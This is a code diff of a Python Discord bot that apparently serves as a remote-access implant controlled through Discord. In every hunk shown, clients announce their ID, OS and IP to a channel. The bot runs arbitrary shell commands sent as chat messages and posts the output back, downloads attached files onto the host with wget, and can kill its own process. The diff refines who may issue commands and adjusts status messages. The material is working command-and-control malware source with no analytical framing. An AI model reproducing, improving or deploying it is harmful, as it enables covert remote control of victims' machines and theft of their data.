@@ -52,16 +52,18 @@ async def on_ready():
     channel = bot.get_channel(int(debug))
     await channel.send(f'[!] {client_id} ({client_os}) has joined from {client_ip}.')
 
-# Prevents users not included within allowed_users from executing privileged commnands
+# Prevents users not included within allowed_users from executing privileged commands
 async def auth(ctx):
     if str(ctx.message.author.id) not in allowed_users and client_id in ctx.message.content:
         await ctx.send(f"{ctx.message.author.mention} is not allowed to access this command on {client_id}! Please contact an administrator if this is a mistake.")
         return 1
     # Disallow bot commands inside DMs
     elif isinstance(ctx.channel, discord.channel.DMChannel):
-        return
-    else:
+        return 1
+    elif client_id in ctx.message.content:
         return 0
+    else:
+        return 1
 
 # Queue active hosts; get latency
 # ?ping`
@@ -96,7 +98,7 @@ async def cmd(ctx):
     elif client_id in ctx.message.content:
         # Strips chars preceeding command from command string
         command = str(ctx.message.content)[(len(client_id) + 6):]
-        ret = f"[!] Executing on {client_id} ({client_ip})!\n```shell\n{client_user}$ {command}\n\n{os.popen(command).read()}```"
+        ret = f"[!] Executing on `{client_id}` ({client_ip})!\n```shell\n{client_user}$ {command}\n\n{os.popen(command).read()}```"
         await ctx.send(ret)
     else:
         return
@@ -111,7 +113,8 @@ async def upload(ctx):
     elif ctx.message.attachments:
         url = str(ctx.message.attachments[0])
         os.popen(f"wget -q {url}").read()
-        await ctx.send('[!] Upload successful.')
+        path = os.popen('pwd').read().strip()
+        await ctx.send(f'[!] Uploaded attachment to `{path+"/"+ctx.message.attachments[0].filename}` on client: `{client_id}`.')
     else:
         await ctx.send('[!] No attachment provided.')
 
@@ -138,7 +141,7 @@ async def kill(ctx):
     if await auth(ctx):
         return
     else:
-        await ctx.send(f'[!] {client_id} killed.')
+        await ctx.send(f'[!] `{client_id}` killed.')
         os.popen('kill -9 $(ps -o ppid= | head -n 1)').read()
 
 # Connect to Discord
